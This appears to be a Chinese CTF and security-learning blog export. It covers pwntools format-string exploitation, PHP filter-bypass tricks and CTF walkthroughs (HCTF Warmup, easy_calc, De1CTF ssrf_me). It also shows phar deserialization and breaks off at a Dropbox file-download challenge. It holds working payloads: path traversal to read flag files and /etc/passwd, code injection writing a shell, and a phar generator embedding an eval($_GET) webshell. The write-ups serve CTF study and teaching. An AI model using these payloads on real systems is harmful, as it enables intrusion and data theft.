<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import tempfile</span><br><span class="line"> </span><br><span class="line">program = tempfile.mktemp()</span><br><span class="line">source  = program + &quot;.c&quot;</span><br><span class="line">write(source, &apos;&apos;&apos;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#define MEMORY_ADDRESS ((void*)0x11111000)</span><br><span class="line">#define MEMORY_SIZE 1024</span><br><span class="line">#define TARGET ((int *) 0x11111110)</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">       char buff[1024];</span><br><span class="line">       void *ptr = NULL;</span><br><span class="line">       int *my_var = TARGET;</span><br><span class="line">       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</span><br><span class="line">       if(ptr != MEMORY_ADDRESS)</span><br><span class="line">       &#123;</span><br><span class="line">               perror(&quot;mmap&quot;);</span><br><span class="line">               return EXIT_FAILURE;</span><br><span class="line">       &#125;</span><br><span class="line">       *my_var = 0x41414141;</span><br><span class="line">       write(1, &amp;my_var, sizeof(int *));</span><br><span class="line">       scanf(&quot;%s&quot;, buff);</span><br><span class="line">       dprintf(2, buff);</span><br><span class="line">       write(1, my_var, sizeof(int));</span><br><span class="line">       return 0;</span><br><span class="line">&#125;&apos;&apos;&apos;)</span><br><span class="line">cmdline = [&quot;gcc&quot;, source, &quot;-Wno-format-security&quot;, &quot;-m32&quot;, &quot;-o&quot;, program]</span><br><span class="line">process(cmdline).wait_for_close()</span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    return p.recvall()</span><br><span class="line"> </span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line">p = process(program, stderr=PIPE)</span><br><span class="line">addr = u32(p.recv(4))</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: 0x1337babe&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print hex(unpack(p.recv(4)))</span><br></pre></td></tr></table></figure>

<p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址:<code>{address1: value1, address2:value2,..., address: valueN}</code>.</p>
<p>有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload .<br><a href="http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload</a></p>
<h2 id="使用-ELF"><a href="#使用-ELF" class="headerlink" title="使用 ELF()"></a>使用 ELF()</h2><p>有些题目给了我们libc. 用 <code>gdb&gt; x function1 — function2</code> 算偏移量太麻烦了, 因此有了 <code>ELF</code>.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">e = ELF(&apos;./example_file&apos;)</span><br><span class="line">print hex(e.address)  # 0x400000</span><br><span class="line">print hex(e.symbols[&apos;write&apos;]) # 0x401680</span><br><span class="line">print hex(e.got[&apos;write&apos;]) # 0x60b070</span><br><span class="line">print hex(e.plt[&apos;write&apos;]) # 0x401680</span><br><span class="line">offset = e.symbols[&apos;system&apos;] - e.symbols[&apos;printf&apos;] # calculate offset</span><br><span class="line">binsh_address = next(e.search(&apos;/bin/sh\x00&apos;)) # find address which contains /bin/sh</span><br></pre></td></tr></table></figure>

<p>和 process() 一样, 我们只用将路径给 ELF(path) 即可分析 ELF.</p>
<p>我们有以下几种方法操纵ELF:</p>
<ul>
<li>symbols[‘a_function’] 找到 a_function 的地址</li>
<li>got[‘a_function’] 找到 a_function的 got</li>
<li>plt[‘a_function’] 找到 a_function 的 plt</li>
<li>next(e.search(“some_characters”)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址.</li>
</ul>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计</title>
    <url>/2019/12/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="php函数绕过小结"><a href="#php函数绕过小结" class="headerlink" title="php函数绕过小结"></a>php函数绕过小结</h1><a id="more"></a>
<h2 id="0-preg-replace"><a href="#0-preg-replace" class="headerlink" title="0.preg_replace()"></a>0.preg_replace()</h2><p>该函数使用正则表达式来进行匹配特定的字符串.</p>
<ul>
<li>问题代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = addslashes($_GET[&apos;option&apos;]);</span><br><span class="line">$file = file_get_contents(&apos;xxxxx/option.php&apos;);</span><br><span class="line">$file = preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$str&apos;;&quot;,$file);</span><br><span class="line">file_put_contents(&apos;xxxxx/option.php&apos;,$file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输入经过addslashes()处理过之后经匹配替换指定文件内容。</p>
<ul>
<li>解法1 利用反斜线</li>
</ul>
<p>输入<code>\&#39;;phpinfo();//</code><br>经过addslashes()之后变为\&#39;，随后preg_replace会将两个连续的\合并为一个，也就是将\&#39;转为\‘，这样我们就成功引入了一个单引号，闭合上文注释下文，中间加入要执行的代码即可.</p>
<ul>
<li>解法2 利用正则<br>过程分为两个请求：</li>
</ul>
<p>第一次传入 aaa’;phpinfo();%0a//</p>
<p>此时文件内容</p>
<p>$option=’aaa&#39;;phpinfo();<br>//‘;<br>第二次传入随意字串，如bbb 正则代码.*会将匹配到的aaa\替换为bbb</p>
<p>此时文件内容(成功写入恶意代码)</p>
<p>$option=’bbb’;phpinfo();<br>//‘;</p>
<ul>
<li>解法3 利用%00<br>仍然分为两步。</li>
</ul>
<p>第一次传入;phpinfo(); 此时文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$option=&apos;;phpinfo();&apos;;</span><br></pre></td></tr></table></figure>

<p>第二次传入%00</p>
<p>%00被addslashes()转为\0，而\0在preg_replace函数中会被替换为“匹配到的全部内容”，此时preg_replace要执行的代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;\0&apos;;&quot;,$file);</span><br></pre></td></tr></table></figure>

<p>也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$option=&apos;;phpinfo();&apos;;&apos;;&quot;,$file);</span><br></pre></td></tr></table></figure>

<p>成功引入单引号闭合，最终写入shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$option=&apos;\$option=&apos;;phpinfo();&apos;;&apos;;</span><br></pre></td></tr></table></figure>

<h2 id="1-MD5"><a href="#1-MD5" class="headerlink" title="1.MD5()"></a>1.MD5()</h2><p>我们都知道，MD5 加密(sha1())是对字符串进行加密，那么如果我们传入的不是字符串，而是一个数组呢？？？ 它没法进行加密，返回空，结果不就相等了吗.(大部分的php函数,如strcmp()无法处理数组,返回值基本是NULL).</p>
<h2 id="2-str-replace"><a href="#2-str-replace" class="headerlink" title="2.str_replace()"></a>2.str_replace()</h2><p>str_replace()函数用于过滤多余字符的,基本可以通过双写目标字符来解决,例如../可以用….//或者…/./来解决,key可以用kkeyey来解决.</p>
<h2 id="3-parse-url"><a href="#3-parse-url" class="headerlink" title="3.parse_url()"></a>3.parse_url()</h2><p>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。<br>对于高版本的php的来说 直接/// 三个斜杠就可以直接解决.</p>
<h2 id="4-intval"><a href="#4-intval" class="headerlink" title="4.intval()"></a>4.intval()</h2><p>intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。<br>即使出现无法转换的字符串，intval()不会报错而是返回0。<br>注：<br>在科学计数法字符串转换为数字时，如果 E 后面的数小于某个值会弄成 double 类型，再强制转换为 int 类型时可能会有奇妙的结果，测试发现某变量为 1e-1000 时已经可以触发这个漏洞绕过两个检查，使得某变量既大于 0 又不大于 0。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump((int)(&apos;1e-1000&apos;)&gt;0);</span><br><span class="line">var_dump(&apos;1e-1000&apos;&gt;0);</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Command line code:1:</span><br><span class="line">bool(true)</span><br><span class="line">Command line code:1:</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<p>再如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump((int)(&apos;1e-10&apos;)&gt;0);</span><br><span class="line">var_dump(&apos;1e-10&apos;&gt;0);</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Command line code:1:</span><br><span class="line">bool(true)</span><br><span class="line">Command line code:1:</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<h2 id="5-array-search"><a href="#5-array-search" class="headerlink" title="5.array_search()"></a>5.array_search()</h2><p>用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比.<br>当检索中带入字符串，比如”sky”，会intval(‘sky’)==0，从而致使数字数组也可以查询成功.</p>
<h2 id="6-switch"><a href="#6-switch" class="headerlink" title="6.switch"></a>6.switch</h2><p>没有break的话不用判断真假即进入下一个case.</p>
<h2 id="7-php-filter协议"><a href="#7-php-filter协议" class="headerlink" title="7.php://filter协议"></a>7.php://filter协议</h2><p>php://filter 这个协议可以用来读取网页base64编码后的源代码。用这句 file=php://filter/read=convert.base64-encode/resource=xxxx.php.</p>
<h2 id="8-附-BUgku平台一道代码审计题"><a href="#8-附-BUgku平台一道代码审计题" class="headerlink" title="8.附:BUgku平台一道代码审计题"></a>8.附:BUgku平台一道代码审计题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;php?</span><br><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">id=_GET[&apos;id&apos;];</span><br><span class="line">a=_GET[&apos;a&apos;];</span><br><span class="line">b=_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;no no no no no no no&apos;;</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line">data=@filegetcontents(a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and id==0andstrlen(b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p> 变量 $id 若想满足非空非零且弱等于整型数 0，则 $id 的值只能为非空非零字符串，这里假设 $id = “asd”.</p>
<p> 源码中变量 $data 是由file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流.在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实.因此这里用伪协议 php:// 来访问输入输出的数据流，其中php://input可以访问原始请求数据中的只读流.这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform!.</p>
<p> ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “\x00”，即满足 “1114” 与 “111”匹配。因此，这里假设 $b = “\x0012345”.</p>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="HCTF-2018-Warmup"><a href="#HCTF-2018-Warmup" class="headerlink" title="HCTF 2018 Warmup"></a>HCTF 2018 Warmup</h2><ul>
<li><p>这个题目原型是phpmyadmin4.8.1的任意文件包含漏洞</p>
</li>
<li><p>点击hint进入，得到提示flag在ffffllllaaaagggg中，并发现URL格式为XXX/index.php?file=hint.php,顺势猜一下file=source.php有没有结果。得到如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>首先看这一段:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>也就是说checkfile的返回值要非空,就会将文件包含.</p>
<ul>
<li>接下来看这段:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这段代码的意思是将post上的数据后面加?,然后提取出?之前的内容.</p>
<ul>
<li>这一段:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>首先对第一次提取出来的内容进行url编码,然后进行第二次提取.第二次提取出来的内容在白名单之内即返回true.</p>
<ul>
<li>最终payload：<code>file=source.php%253f/../../../../../ffffllllaaaagggg</code><br>第一次提取:<code>source.php%3f/../../../../../ffffllllaaaagggg</code><br>url编码后:<code>source.php?/../../../../../ffffllllaaaagggg</code><br>第二次提取:<code>source.php</code>,在白名单中则返回true.<br>但是在进行文件包含的时候依然会是原字符串,source.php%3f是个不存在的目录,依然不会影响.<h2 id="BUUCTF-easy-calc-国赛love-math"><a href="#BUUCTF-easy-calc-国赛love-math" class="headerlink" title="BUUCTF easy_calc(国赛love_math)"></a>BUUCTF easy_calc(国赛love_math)</h2></li>
<li>看一下页面源码，发现了提示：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calc.php?num=encodeURIComponent($(&quot;#content&quot;).val())</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>$(“#content”).val() 是什么意思：</p>
<p>获取id为content的HTML标签元素的值,是JQuery,     $(“#content”)相当于document.getElementById(“content”);       $(“#content”).val()相当于 document.getElementById(“content”).value;</p>
<p>但是无论怎么注入都是400,403和500，这里用的是一个新的点：PHP的字符串解析特性:<br>我们知道PHP将查询字符串（在URL或正文中）转换为内部$ _GET或关联的关联$ _POST。例如<code>：/？foo = bar</code>变成<code>Array（[foo] =&gt;“ bar”）</code>。是，查询字符串在解析的过程中可以被某些字符删除或用下划线代替。例如，<code>/？％20news [id％00 = 42</code>会转换为<code>Array（[news_id] =&gt; 42）</code>。在解析查询字符串时，它会做两件事：1.删​​除空白符2.将某些字符转换为下划线（包括空格）.</p>
<ul>
<li><p>扫一下根目录，发现flagg文件：<code>?%20num=1;var_dump(scandir(chr(47)))</code></p>
</li>
<li><p>列出flagg:<code>?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<h2 id="De1CTF-ssrf-me"><a href="#De1CTF-ssrf-me" class="headerlink" title="De1CTF ssrf_me"></a>De1CTF ssrf_me</h2></li>
<li><p>直接查看页面源代码可以看到正确格式的代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">#encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;latin1&apos;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&apos;data&apos;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">                result[&apos;data&apos;] = f.read()</span><br><span class="line">            if result[&apos;code&apos;] == 500:</span><br><span class="line">                result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&apos;code&apos;] = 500</span><br><span class="line">            result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;,port=80)</span><br></pre></td></tr></table></figure>
</li>
<li><p>提示给的是 flag 在 ./flag.txt 中，题目单词打错了.</p>
</li>
<li><p>python 的 flask 框架，三个路由，index 用于获取源码，geneSign 用于生成 md5，De1ta 就是挑战</p>
</li>
<li><p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，param=flag.txt，action 中要含有 read 和 scan，且 sign=md5(secert_key + param + action)</p>
</li>
<li><p>试着访问了一下 /geneSign?param=flag.txt ，给出了一个 md5 f36ac37ddfdcc567b5e4bfafd989672e ，但是只有 scan 的功能，想加入 read 功能就要另想办法了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br></pre></td></tr></table></figure>
</li>
<li><p>看了一下逻辑，在 getSign 处很有意思，这个字符串拼接的就很有意思了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
</li>
<li><p>不妨假设 secert_key 是 xxx ，那么在开始访问 /geneSign?param=flag.txt 的时候，返回的 md5 就是 md5(‘xxx’ + ‘flag.txt’ + ‘scan’) ，在 python 里面上述表达式就相当于 md5(xxxflag.txtscan) ，这就很有意思了。</p>
</li>
<li><p>直接构造访问 /geneSign?param=flag.txtread ，拿到的 md5 就是 md5(‘xxx’ + ‘flag.txtread’ + ‘scan’) ，等价于 md5(‘xxxflag.txtreadscan’) ，这就达到了目标。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2019/12/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="关于phar反序列化"><a href="#关于phar反序列化" class="headerlink" title="关于phar反序列化"></a>关于phar反序列化</h1><a id="more"></a>
<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><ul>
<li>简单的说，phar就是php的压缩文件，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。<br>phar结构由 4 部分组成:</li>
<li>stub:phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；</li>
<li>manifest:压缩文件的属性等信息，以序列化存储；</li>
<li>contents:压缩文件的内容；</li>
<li>signature:签名，放在文件末尾；<br>这里有两个关键点：</li>
<li>一是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</li>
<li>二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。<br>受影响的文件函数:fileatime,filectime,file_exists,file_get_contents,file_put_contents,file,filegroup,fopen,fileinode,filemtime,fileowner,fileperms,is_dir,is_executable,is_file,is_link,is_readable,is_writable,is_writeable,parse_ini_file,copy,unlink,stat,readfile.<br>如果有文件test.php:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Testobj</span><br><span class="line">&#123;</span><br><span class="line">	var $output=&quot;echo &apos;ok&apos;;&quot;;</span><br><span class="line">	function __destruct()</span><br><span class="line">	&#123;</span><br><span class="line">		eval($this-&gt;output);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;filename&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	$filename=$_GET[&apos;filename&apos;];</span><br><span class="line">	var_dump(file_exists($filename));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>生成phar的文件phar.phar可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Testobj</span><br><span class="line">&#123;</span><br><span class="line">  var $output=&apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&apos;test.phar&apos;);   //删除之前的test.par文件(如果有)</span><br><span class="line">$phar=new Phar(&apos;test.phar&apos;);  //创建一个phar对象，文件名必须以phar为后缀</span><br><span class="line">$phar-&gt;startBuffering();  //开始写文件</span><br><span class="line">$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ?&gt;&apos;);  //写入stub</span><br><span class="line">$o=new Testobj();  </span><br><span class="line">$o-&gt;output=&apos;eval($_GET[&quot;a&quot;]);&apos;;  </span><br><span class="line">$phar-&gt;setMetadata($o);//写入meta-data</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这样，当我们访问phar.phpr时，将会生成test.phar的phar文件。之后再将其作为参数传到test.php中，就可getshell.</p>
<p>利用条件:</p>
<ul>
<li>phar文件要能够上传到服务器端.</li>
<li>要有魔术方法作为跳板.</li>
<li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file().</li>
<li>文件操作函数的参数可控，且:、/、phar等特<br>殊字符没有被过滤.<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2></li>
<li>进入题目随便注册一个账号，可以上传文件filename=<code>.htaccess.jpg</code>。上传了之后可以删除和下载文件。在下载文件的包中发现是通过post参数filename来进行的，所以尝试能不能进行任意文件下载。<br>修改filename可进行任意文件的下载(下载不了flag)。<code>filename=../../../../../etc/passwd</code>.</li>
